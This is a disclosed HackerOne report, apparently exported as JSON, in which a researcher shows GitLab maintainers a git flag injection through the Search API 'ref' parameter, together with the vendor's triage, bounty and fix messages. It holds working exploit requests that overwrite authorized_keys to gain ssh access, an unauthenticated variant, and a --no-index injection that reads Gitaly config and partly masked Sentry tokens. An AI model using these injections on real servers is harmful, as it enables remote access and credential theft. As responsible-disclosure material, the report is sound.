{"id":658013,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NTgwMTM=","url":"https://hackerone.com/reports/658013","title":"Git flag injection - local file overwrite to remote code execution","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-07-24T13:23:41.478Z","submitted_at":"2019-07-24T13:23:41.478Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"vakzz","url":"/vakzz","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-12-19T00:29:02.683Z","bug_reporter_agreed_on_going_public_at":"2019-10-14T04:10:39.153Z","team_member_agreed_on_going_public_at":"2019-12-19T00:29:02.557Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Summary\n\nThe `wiki_blobs` scope of the Search API can be provided with an arbitrary `ref` parameter, allowing for additional flags to be injected into the git command. \n\nFor example the following API call:\n\n```\n`curl --header \"PRIVATE-TOKEN: $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs\u0026search=page\u0026ref=--output=/tmp/file'`\n```\n\nThe above will generate the following git command causing the the last commit log to be written to `/tmp/file`\n\n```\n/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.wiki.git log --max-count=1 --output=/tmp/file\n```\n\n### Steps to reproduce\n\n1. Create a wiki new wiki page called `page` with the commit message `controlled content`\n2. Search for the wiki blob via the Search API, with the injected ref flag:\n```\ncurl --header \"PRIVATE-TOKEN: $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs\u0026search=page\u0026ref=--output=/tmp/file'\n```\n3. See that the file has been created:\n```\ngit@gitlab-vm:~$ cat /tmp/file\ncommit f00f9538d29b176e9dfb2eb1bfe1eab190cad3d9\nAuthor: Administrator \u003cadmin@example.com\u003e\nDate:   Wed Jul 24 13:08:51 2019 +0000\n\n    controlled content\n```\n\n\n### Impact\nThis can be used to overwrite `/var/opt/gitlab/.ssh/authorized_keys` with an attackers key by following the above steps allowing remote access and code execution.\n\n1. Create a new rsa key\n2. Create a new wiki page setting the commit message to the rsa public key\n3. Run the Search API with `ref=--output=/var/opt/gitlab/.ssh/authorized_keys`\n4. ssh into gitlab using the created key:\n\n```\n$ ssh git@gitlab-vm.local -i gitlab\nWelcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-70-generic x86_64)\n$ id\nuid=998(git) gid=998(git) groups=998(git)\n\n$ cat /var/opt/gitlab/.ssh/authorized_keys\ncommit 00c8e52996654d02bcbdba47dc25ee73671cbfd6\nAuthor: Administrator \u003cadmin@example.com\u003e\nDate:   Wed Jul 24 12:56:23 2019 +0000\n\n    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxsqkWZobL5DBOnM3rtE7ZDP4d9v0lABJRGJbovHHTNY2iH3x3pjjerPfLDO21Gkyfzn4J+x6O6GleMAB5nxnZRH7E44khfW6Ldql29Rv2Q/IYCsBSKxGT6RCOFusoRi1uHlQmexIh4gZkmPeFfDLTy70Xv3FpPLfKE/EiVOjuEtY9JUC4MVlPHaTzZ2HE4sZT5tvcm9YtSpjT2v0SMR8uCXcKMAx4Tsu/Un2N5UziXgtRF+vD0fRhNyKIkOtULwBgWkL5RE71vYbxOhviqTAld7r70TIWSzSUHcUewbMS5XcEdBwl3XI/9qzo+jOA0Ulf2bkkROpELBoHwfLdpu9p will@MacBook-Pro.local\n```\n\n### What is the current *bug* behavior?\nThe `ref` param is passed directly to the git command without being sanitized.\n\n### What is the expected *correct* behavior?\nThe `ref` param should be sanitized or used in a way that doesn't allow for flag injection \n\n#### Results of GitLab environment info\n\n```\n$ sudo gitlab-rake gitlab:env:info\n\nSystem information\nSystem:\t\tUbuntu 16.04\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.6.3p62\nGem Version:\t2.7.9\nBundler Version:1.17.3\nRake Version:\t12.3.2\nRedis Version:\t3.2.12\nGit Version:\t2.21.0\nSidekiq Version:5.2.7\nGo Version:\tunknown\n\nGitLab information\nVersion:\t12.1.0\nRevision:\t295480f4553\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t10.7\nURL:\t\thttp://gitlab-vm.local\nHTTP Clone URL:\thttp://gitlab-vm.local/some-group/some-project.git\nSSH Clone URL:\tgit@gitlab-vm.local:some-group/some-project.git\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers:\n\nGitLab Shell\nVersion:\t9.3.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nAn attacker can overwrite or create files with mostly controlled content, allowing them to gain remote ssh access to gitlab as the `git` user","vulnerability_information_html":"\u003ch3 id=\"summary\"\u003eSummary\u003c/h3\u003e\n\n\u003cp\u003eThe \u003ccode\u003ewiki_blobs\u003c/code\u003e scope of the Search API can be provided with an arbitrary \u003ccode\u003eref\u003c/code\u003e parameter, allowing for additional flags to be injected into the git command. \u003c/p\u003e\n\n\u003cp\u003eFor example the following API call:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e`curl --header \u0026quot;PRIVATE-TOKEN: $TOKEN\u0026quot; \u0026#39;http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs\u0026amp;search=page\u0026amp;ref=--output=/tmp/file\u0026#39;`\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe above will generate the following git command causing the the last commit log to be written to \u003ccode\u003e/tmp/file\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.wiki.git log --max-count=1 --output=/tmp/file\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003eCreate a wiki new wiki page called \u003ccode\u003epage\u003c/code\u003e with the commit message \u003ccode\u003econtrolled content\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eSearch for the wiki blob via the Search API, with the injected ref flag:\n\u003ccode\u003e\ncurl --header \u0026quot;PRIVATE-TOKEN: $TOKEN\u0026quot; \u0026#39;http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs\u0026amp;search=page\u0026amp;ref=--output=/tmp/file\u0026#39;\n\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSee that the file has been created:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003egit@gitlab-vm:~$ cat /tmp/file\ncommit f00f9538d29b176e9dfb2eb1bfe1eab190cad3d9\nAuthor: Administrator \u0026lt;admin@example.com\u0026gt;\nDate:   Wed Jul 24 13:08:51 2019 +0000\n\ncontrolled content\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"impact\"\u003eImpact\u003c/h3\u003e\n\n\u003cp\u003eThis can be used to overwrite \u003ccode\u003e/var/opt/gitlab/.ssh/authorized_keys\u003c/code\u003e with an attackers key by following the above steps allowing remote access and code execution.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eCreate a new rsa key\u003c/li\u003e\n\u003cli\u003eCreate a new wiki page setting the commit message to the rsa public key\u003c/li\u003e\n\u003cli\u003eRun the Search API with \u003ccode\u003eref=--output=/var/opt/gitlab/.ssh/authorized_keys\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003essh into gitlab using the created key:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ssh git@gitlab-vm.local -i gitlab\nWelcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-70-generic x86_64)\n$ id\nuid=998(git) gid=998(git) groups=998(git)\n\n$ cat /var/opt/gitlab/.ssh/authorized_keys\ncommit 00c8e52996654d02bcbdba47dc25ee73671cbfd6\nAuthor: Administrator \u0026lt;admin@example.com\u0026gt;\nDate:   Wed Jul 24 12:56:23 2019 +0000\n\n    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxsqkWZobL5DBOnM3rtE7ZDP4d9v0lABJRGJbovHHTNY2iH3x3pjjerPfLDO21Gkyfzn4J+x6O6GleMAB5nxnZRH7E44khfW6Ldql29Rv2Q/IYCsBSKxGT6RCOFusoRi1uHlQmexIh4gZkmPeFfDLTy70Xv3FpPLfKE/EiVOjuEtY9JUC4MVlPHaTzZ2HE4sZT5tvcm9YtSpjT2v0SMR8uCXcKMAx4Tsu/Un2N5UziXgtRF+vD0fRhNyKIkOtULwBgWkL5RE71vYbxOhviqTAld7r70TIWSzSUHcUewbMS5XcEdBwl3XI/9qzo+jOA0Ulf2bkkROpELBoHwfLdpu9p will@MacBook-Pro.local\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"what-is-the-current-bug-behavior\"\u003eWhat is the current \u003cem\u003ebug\u003c/em\u003e behavior?\u003c/h3\u003e\n\n\u003cp\u003eThe \u003ccode\u003eref\u003c/code\u003e param is passed directly to the git command without being sanitized.\u003c/p\u003e\n\n\u003ch3 id=\"what-is-the-expected-correct-behavior\"\u003eWhat is the expected \u003cem\u003ecorrect\u003c/em\u003e behavior?\u003c/h3\u003e\n\n\u003cp\u003eThe \u003ccode\u003eref\u003c/code\u003e param should be sanitized or used in a way that doesn\u0026#39;t allow for flag injection \u003c/p\u003e\n\n\u003ch4 id=\"results-of-gitlab-environment-info\"\u003eResults of GitLab environment info\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ sudo gitlab-rake gitlab:env:info\n\nSystem information\nSystem:     Ubuntu 16.04\nCurrent User:   git\nUsing RVM:  no\nRuby Version:   2.6.3p62\nGem Version:    2.7.9\nBundler Version:1.17.3\nRake Version:   12.3.2\nRedis Version:  3.2.12\nGit Version:    2.21.0\nSidekiq Version:5.2.7\nGo Version: unknown\n\nGitLab information\nVersion:    12.1.0\nRevision:   295480f4553\nDirectory:  /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter: PostgreSQL\nDB Version: 10.7\nURL:        http://gitlab-vm.local\nHTTP Clone URL: http://gitlab-vm.local/some-group/some-project.git\nSSH Clone URL:  git@gitlab-vm.local:some-group/some-project.git\nUsing LDAP: no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:    9.3.0\nRepository storage paths:\n- default:  /var/opt/gitlab/git-data/repositories\nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\nGit:        /opt/gitlab/embedded/bin/git\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker can overwrite or create files with mostly controlled content, allowing them to gain remote ssh access to gitlab as the \u003ccode\u003egit\u003c/code\u003e user\u003c/p\u003e\n","bounty_amount":"12000.0","formatted_bounty":"$12,000","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":740,"voters":["acut3","feedadad","buyabez","sky003","iqimpz","sinkmanu","r4d1kal","sultancad","hackerontwowheels","cdl","and 730 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":18138,"asset_type":"URL","asset_identifier":"gitlab.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5417209,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-24T13:25:33.100Z","updated_at":"2019-07-24T13:25:33.100Z","additional_data":{"old_title":"Git flag injection leading allowing controlled local file overwrite","new_title":"Git flag injection - local file overwrite to remote code execution"},"actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5417862,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This can also be triggered without any authentication via the search page, eg:\n \nhttp://gitlab-vm.local/search?scope=wiki_blobs\u0026search=page\u0026project_id=4\u0026repository_ref=--output=/tmp/file2\n\nAlthough an attacker wouldn't have as much control over the file contents (if any).","markdown_message":"\u003cp\u003eThis can also be triggered without any authentication via the search page, eg:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://gitlab-vm.local/search?scope=wiki_blobs\u0026amp;search=page\u0026amp;project_id=4\u0026amp;repository_ref=--output=/tmp/file2\" href=\"/redirect?url=http%3A%2F%2Fgitlab-vm.local%2Fsearch%3Fscope%3Dwiki_blobs%26search%3Dpage%26project_id%3D4%26repository_ref%3D--output%3D%2Ftmp%2Ffile2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gitlab-vm.local/search?scope=wiki_blobs\u0026amp;search=page\u0026amp;project_id=4\u0026amp;repository_ref=--output=/tmp/file2\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAlthough an attacker wouldn\u0026#39;t have as much control over the file contents (if any).\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-24T14:14:21.866Z","updated_at":"2019-07-24T14:14:21.866Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5418160,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @vakzz,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 14 business days with an update.\n\nPlease refrain from submitting your report or inquiring about its status through\nadditional channels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report. We will investigate the issue as soon as possible.\u003cbr\u003e\nDue to our current workload, we will get back within 14 business days with an update.\u003c/p\u003e\n\n\u003cp\u003ePlease refrain from submitting your report or inquiring about its status through\u003cbr\u003e\nadditional channels, as this unnecessarily binds resources in the security team.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2019-07-24T14:20:21.063Z","updated_at":"2019-07-24T14:20:21.063Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5418162,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitaly/issues/1801.  This issue will be made public 30 days following the release of a patch.\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nSecurity Team | GitLab Inc.","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report.\u003c/p\u003e\n\n\u003cp\u003eWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at \u003ca title=\"https://gitlab.com/gitlab-org/gitaly/issues/1801\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitaly%2Fissues%2F1801\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitaly/issues/1801\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.  This issue will be made public 30 days following the release of a patch.\u003c/p\u003e\n\n\u003cp\u003eWe will continue to update you via HackerOne as a patch is scheduled for release.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-24T14:20:50.808Z","updated_at":"2019-07-24T14:20:50.808Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5418476,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e Although an attacker wouldn't have as much control over the file contents (if any).\n\nRegarding the unauthenticated method, if there are any public wiki pages on the gitlab instance then it's possible to clone the wiki git as an unauthenticated user and find out exactly what the contents of the overwritten file will be using `git log --max-count=1`. Then `gitlab_shell_secret` could be overwritten with known content, resulting in gaining access to the Internal API.","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eAlthough an attacker wouldn\u0026#39;t have as much control over the file contents (if any).\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eRegarding the unauthenticated method, if there are any public wiki pages on the gitlab instance then it\u0026#39;s possible to clone the wiki git as an unauthenticated user and find out exactly what the contents of the overwritten file will be using \u003ccode\u003egit log --max-count=1\u003c/code\u003e. Then \u003ccode\u003egitlab_shell_secret\u003c/code\u003e could be overwritten with known content, resulting in gaining access to the Internal API.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-24T15:18:05.265Z","updated_at":"2019-07-24T15:18:05.265Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5423765,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ETA for fix:\n\nHi @vakzz,\n\nThe GitLab issue created from your report is currently scheduled for 2019-08-22.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eETA for fix:\u003c/p\u003e\n\n\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe GitLab issue created from your report is currently scheduled for 2019-08-22.\u003c/p\u003e\n\n\u003cp\u003eThank you again for contacting us!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2019-07-25T04:27:08.631Z","updated_at":"2019-07-25T04:27:08.631Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5502145,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThank you again for the report! Your finding has been reviewed and we are awarding a $12,000 bounty prior the release of a patch. Congratulations!\n\nWe will continue to keep you updated via HackerOne as a fix is scheduled.\n\nBest regards,\nSecurity Team | GitLab Inc.\n","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! Your finding has been reviewed and we are awarding a $12,000 bounty prior the release of a patch. Congratulations!\u003c/p\u003e\n\n\u003cp\u003eWe will continue to keep you updated via HackerOne as a fix is scheduled.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-05T12:15:05.740Z","updated_at":"2019-08-05T12:15:05.740Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5502149,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-05T12:15:26.996Z","updated_at":"2019-08-05T12:15:26.996Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"12000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"vakzz","url":"/vakzz"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5502979,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @hackerjuan,\n\nAwesome thank you! Once the release is out I'll confirm the fix and report back.\n\nCheers,\nWill\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/hackerjuan\"\u003e@hackerjuan\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eAwesome thank you! Once the release is out I\u0026#39;ll confirm the fix and report back.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nWill\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-05T13:30:42.844Z","updated_at":"2019-08-05T13:30:42.844Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5580377,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi,\n\nThank you again for the report! Your finding has been patched in GitLab version 12.1.6 and you should no longer be able to reproduce it.\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nSecurity Team | GitLab Inc.\n","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! Your finding has been patched in GitLab version 12.1.6 and you should no longer be able to reproduce it.\u003c/p\u003e\n\n\u003cp\u003ePlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab\u0026#39;s issue tracker.\u003c/p\u003e\n\n\u003cp\u003eWe look forward to your next report!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-15T00:35:28.592Z","updated_at":"2019-08-15T00:35:28.592Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"vakzz","url":"/vakzz"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5581423,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @hackerjuan,\n\nThe `wiki_blobs` scope is fixed in the latest version and can no longer have arguments injected into it. It looks like the `blobs` scope is still vulnerable though and allows reading any file in `/var/opt/gitlab/gitaly/` including `config.toml`. For example:\n\n```bash\ncurl --header \"PRIVATE-TOKEN: $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs\u0026search=.\u0026ref=--no-index\n\n[{\"basename\":null,\"data\":\"VERSION\\u00001\\u0000Gitaly, version 1.53.2\\n\",\"filename\":null,\"id\":null,\"ref\":\"--no-index\",\"startline\":0,\"project_id\":4},{\"basename\":null,\"data\":\"config.toml\\u00001\\u0000# Gitaly configuration file\\nconfig.toml\\u00002\\u0000# This file is managed by gitlab-ctl. Manual changes will be\\nconfig.toml\\u00003\\u0000# erased! To change the contents below, edit /etc/gitlab/gitlab.rb\\nconfig.toml\\u00004\\u0000# and run:\\nconfig.toml\\u00005\\u0000# sudo gitlab-ctl reconfigure\\nconfig.toml\\u00006\\u0000\\nconfig.toml\\u00007\\u0000socket_path = '/var/opt/gitlab/gitaly/gitaly.socket'\\nconfig.toml\\u00008\\u0000bin_dir = '/opt/gitlab/embedded/bin'\\nconfig.toml\\u00009\\u0000\\n\",\"filename\":null,\"id\":null,\"ref\":\"--no-index\",\"startline\":0,\"project_id\":4}]\n```\n\nI'm not sure if this will be fixed by one of the other reports I submitted, but `gitlab.com` is still vulnerable, `config.toml` doesn't contain too much but in this case it does contain the `sentry.io` api tokens:\n\n`https://gitlab.com/api/v4/projects/2009901/search?scope=blobs\u0026search=a\u0026ref=--no-index`\n\n```\nsentry_dsn = 'https://927bee37df654608xxxxxxxxxxxxxxxx:0324504ee7844264xxxxxxxxxxxxxxxx@sentry.gitlab.net/16\nruby_sentry_dsn = 'https://8ff7dd344e1d4976xxxxxxxxxxxxxxxx:bb9d785b3fe7447bxxxxxxxxxxxxxxxx@sentry.gitlab.net/29\n```\n\nLet me know if you want me to submit another report or require any other information.\n\nCheers,\nWill","markdown_message":"\u003cp\u003eHi \u003ca href=\"/hackerjuan\"\u003e@hackerjuan\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003ewiki_blobs\u003c/code\u003e scope is fixed in the latest version and can no longer have arguments injected into it. It looks like the \u003ccode\u003eblobs\u003c/code\u003e scope is still vulnerable though and allows reading any file in \u003ccode\u003e/var/opt/gitlab/gitaly/\u003c/code\u003e including \u003ccode\u003econfig.toml\u003c/code\u003e. For example:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"nt\"\u003e--header\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;PRIVATE-TOKEN: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$TOKEN\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan 